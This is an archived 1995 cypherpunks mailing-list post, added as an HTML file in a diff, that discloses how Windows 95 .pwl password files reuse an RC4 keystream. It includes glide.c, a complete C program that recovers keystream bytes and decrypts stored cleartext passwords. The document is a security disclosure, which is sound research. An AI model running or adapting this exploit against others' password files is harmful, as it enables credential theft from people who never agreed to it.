@@ -1,0 +1,289 @@
+<!-- MHonArc v2.4.3 -->
+<!--X-Subject: Cracked: WINDOWS.PWL -->
+<!--X-From-R13: Tenax Oaqerj Egrirafba <senaxNshapbz.ab> -->
+<!--X-Date: Mon, 4 Dec 95 08:52:01 PST -->
+<!--X-Message-Id: Pine.SGI.3.91.951204174641.2847A&#45;100000@odin -->
+<!--X-Content-Type: text/plain -->
+<!--X-Head-End-->
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML//EN">
+<HTML>
+<HEAD>
+<TITLE>Cracked: WINDOWS.PWL</TITLE>
+<LINK REV="made" HREF="mailto:frank@funcom.no">
+</HEAD>
+<BODY>
+<!--X-Body-Begin-->
+<!--X-User-Header-->
+<!--X-User-Header-End-->
+<!--X-TopPNI-->
+<HR>
+[<A HREF="msg01224.html">Date Prev</A>][<A HREF="msg01229.html">Date Next</A>][<A HREF="msg01224.html">Thread Prev</A>][<A HREF="msg01225.html">Thread Next</A>][<A HREF="index.html#01253">Date Index</A>][<A HREF="threads.html#01253">Thread Index</A>]
+<!--X-TopPNI-End-->
+<!--X-MsgBody-->
+<!--X-Subject-Header-Begin-->
+<H1>Cracked: WINDOWS.PWL</H1>
+<HR>
+<!--X-Subject-Header-End-->
+<!--X-Head-of-Message-->
+<UL>
+<LI><em>To</em>: <A HREF="mailto:cypherpunks@toad.com">cypherpunks@toad.com</A></LI>
+<LI><em>Subject</em>: Cracked: WINDOWS.PWL</LI>
+<LI><em>From</em>: Frank Andrew Stevenson &lt;<A HREF="mailto:frank@funcom.no">frank@funcom.no</A>&gt;</LI>
+<LI><em>Date</em>: Mon, 4 Dec 1995 17:51:36 +0100 (MET)</LI>
+<LI><em>Sender</em>: <A HREF="mailto:owner%2Dcypherpunks@toad.com">owner-cypherpunks@toad.com</A></LI>
+</UL>
+<!--X-Head-of-Message-End-->
+<!--X-Head-Body-Sep-Begin-->
+<HR>
+<!--X-Head-Body-Sep-End-->
+<!--X-Body-of-Message-->
+<PRE>
+A few days ago Peter Gutmann posted a description on how
+Windows 95 produces RC4 keys of 32 bits size to protect
+the .pwl files. I verified the information and wrote a
+program to decrypt .pwl files with a known password, I then
+discovered that the .pwl files where well suited for a known
+plaintext attack as the 20 first bytes are completely predictable.
+
+The 20 first bytes of any .pwl files contains the username, which
+is the same as the filename, in capitals, padded with 0x00. From then
+I wrote a program to bruteforce the .pwl file and optimized it
+so it would run in less than 24 hours on an SGI. I run a test
+of the bruter software and recovered an unknown rc4 key in 8 hours,
+but the decrypted file was still largely uninteligeble, I then proceeded
+to decrypt the file at all possible starting points, and discovered
+valuable information (cleartext passwords) offset in the file.
+
+This has enormous implications: RC4 is a stream cipher, it
+generates a long pseudo random stream that it uses to XOR the
+data byte by byte. This isn't neccecaraly weak encryption if you
+don't use the same stream twice: however WIN95 does, every resource is
+XORed with the same pseudo random stream. What's more the 20
+first bytes are easy to guess. This is easy to exploit:
+XOR the 20 bytes starting at position 0x208 with the user name
+in uppercase, and slide this string through the rest of the file
+(xoring it with whatever is there) this reveals the 20
+first bytes of the different resources.
+
+From there I went on to study the structure of the .pwl file it is
+something like this (decrypted):
+
+USERNAME.........wpwpwpwpwpwpwpwpwpwp
+rs???????
+rs
+rs
+rs???????????
+rs???????
+
+where wp is i word pointer to the different resources (from start
+of pwl file) The 2 first bytes of the resource (rs) is its length in bytes
+(of course XOR with RC4 output) It is the fairly easy to find all the
+resource pointers by jumping from start of resource to next resource,
+had it not been for the fact that the size sometimes is incorrect
+(courtesy of M$)
+
+What follows is a short c program that tries to remedy this and
+reconstruct the pointertable thus generating at least 54 bytes of the RC4
+pseudorandom stream, and then proceedes to decrypt as much as possible from
+the different resources.
+
+What does this show? Although RC4 is a fairly strong cipher, it has the
+same limitations as any XOR streamcipher, and implementing it without
+sufficient knowledge can have dire consequences. I strongly suggest that
+the programmers at Microsoft do their homework before trying anything like
+this again! 
+
+
+ 
+DISCLAIMER:
+This is a quick hack, I don't make any claims about usefulness for
+any purpose, nor do I take responsibility for use nor consequences of
+use of the software. FUNCOM of Norway is not responsible for any of this,
+(I speak for myself, and let others speak for themselves)
+
+This source is hereby placed in the public domain, please
+improve if you can.
+
+--- glide.c ---
+
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+
+unsigned char Data[100001];
+unsigned char keystream[1001];
+int Rpoint[300];
+
+
+main (int argc,char *argv[]) {
+	FILE *fd;
+	int 	i,j,k;
+	int	size;
+	char ch;
+	char *name;
+	int cracked;
+	int sizemask;
+	int maxr;
+	int rsz;
+	int pos;
+	int Rall[300]; /* resource allocation table */
+
+
+	if (argc&lt;2) {
+		printf("usage: glide filename (username)");
+		exit(1);
+	}
+	
+	/* read PWL file */
+
+	fd=fopen(argv[1],"rb");
+	if(fd==NULL) {
+		printf("can't open file %s",argv[2]);
+		exit(1);
+	}
+	size=0;
+	while(!feof(fd)) {
+		Data[size++]=fgetc(fd);
+	}
+	size--;
+	fclose(fd);
+
+	/* find username */
+	name=argv[1];
+	if(argc&gt;2) name=argv[2];
+	printf("Username: %s\n",name);
+
+	/* copy encrypted text into keystream */
+	cracked=size-0x0208;
+	if(cracked&lt;0) cracked=0;
+	if(cracked&gt;1000) cracked=1000;
+	memcpy(keystream,Data+0x208,cracked );
+
+	/* generate 20 bytes of keystream */
+	for(i=0;i&lt;20;i++) {
+		ch=toupper(name[i]);
+		if(ch==0) break;
+		if(ch=='.') break;
+		keystream[i]^=ch;		
+	};
+	cracked=20;
+
+
+	/* find allocated resources */
+
+	sizemask=keystream[0]+(keystream[1]&lt;&lt;8);
+	printf("Sizemask: %04X\n",sizemask);
+
+	for(i=0;i&lt;256;i++) Rall[i]=0;
+
+	maxr=0;
+	for(i=0x108;i&lt;0x208;i++) {
+		if(Data[i]!=0xff) {
+			Rall[Data[i]]++;
+			if (Data[i]&gt;maxr) maxr=Data[i];
+		}
+	}
+	maxr=(((maxr/16)+1)*16);	/* resource pointer table size appears to be divisible by 16 */
+
+	/* search after resources */
+
+	Rpoint[0]=0x0208+2*maxr+20+2;	/* first resource */
+	for(i=0;i&lt;maxr;i++) {
+		/* find size of current resource */
+		pos=Rpoint[i];
+		rsz=Data[pos]+(Data[pos+1]&lt;&lt;8);
+		rsz^=sizemask;
+		printf("Analyzing block with size: %04x\t(%d:%d)\n",rsz,i,Rall[i]);
+		if( (Rall[i]==0) &amp;&amp; (rsz!=0) ) {
+			printf("unused resource has nonzero size !!!\n");
+			exit(0);
+		}
+
+		pos+=rsz;
+
+		/* Resources have a tendency to have the wrong size for some reason */
+		/* check for correct size */
+
+		if(i&lt;maxr-1) {
+			while(Data[pos+3]!=keystream[1]) {
+				printf(":(%02x)",Data[pos+3]);
+				pos+=2; /* very rude may fail */
+			}
+		}
+
+		pos+=2;	/* include pointer in size */
+		Rpoint[i+1]=pos;
+	}
+	Rpoint[maxr]=size;
+
+	/* insert Table data into keystream */
+	for(i=0;i &lt;= maxr;i++) {
+		keystream[20+2*i]^=Rpoint[i] &amp; 0x00ff;
+		keystream[21+2*i]^=(Rpoint[i] &gt;&gt; 8) &amp; 0x00ff;
+	}
+	cracked+=maxr*2+2;	
+
+	printf("%d bytes of keystream recovered\n",cracked);
+
+	/* decrypt resources */
+	for(i=0;i &lt; maxr;i++) {
+		rsz=Rpoint[i+1]-Rpoint[i];
+		if (rsz&gt;cracked) rsz=cracked;
+		printf("Resource[%d] (%d)\n",i,rsz);
+		for(j=0;j&lt;rsz;j++) printf("%c",Data[Rpoint[i]+j]^keystream[j]);
+		printf("\n");
+	}
+
+
+	exit(0);	
+}
+
+--- end ---
+
+
+#include &lt;std/disclaimer.h&gt; 
+E3D2BCADBEF8C82F A5891D2B6730EA1B PGPencrypted mail preferred, finger for key
+
+
+
+</PRE>
+
+<!--X-Body-of-Message-End-->
+<!--X-MsgBody-End-->
+<!--X-Follow-Ups-->
+<HR>
+<UL><LI><STRONG>Follow-Ups</STRONG>:
+<UL>
+<LI><STRONG><A NAME="01225" HREF="msg01225.html">Re: Cracked: WINDOWS.PWL</A></STRONG>
+<UL><LI><EM>From:</EM> Rich Graves &lt;llurch@networking.stanford.edu&gt;</LI></UL></LI>
+</UL></LI></UL>
+<!--X-Follow-Ups-End-->
+<!--X-References-->
+<!--X-References-End-->
+<!--X-BotPNI-->
+<UL>
+<LI>Prev by Date:
+<STRONG><A HREF="msg01224.html">[farber@central.cis.upenn.edu: IP: NSC Announce -- iPower home page/CryptoSampler announcement]</A></STRONG>
+</LI>
+<LI>Next by Date:
+<STRONG><A HREF="msg01229.html">Re: No Privacy Right in the Americas ?</A></STRONG>
+</LI>
+<LI>Prev by thread:
+<STRONG><A HREF="msg01224.html">[farber@central.cis.upenn.edu: IP: NSC Announce -- iPower home page/CryptoSampler announcement]</A></STRONG>
+</LI>
+<LI>Next by thread:
+<STRONG><A HREF="msg01225.html">Re: Cracked: WINDOWS.PWL</A></STRONG>
+</LI>
+<LI>Index(es):
+<UL>
+<LI><A HREF="index.html#01253"><STRONG>Date</STRONG></A></LI>
+<LI><A HREF="threads.html#01253"><STRONG>Thread</STRONG></A></LI>
+</UL>
+</LI>
+</UL>
+
+<!--X-BotPNI-End-->
+<!--X-User-Footer-->
+<!--X-User-Footer-End-->
+</BODY>
+</HTML>
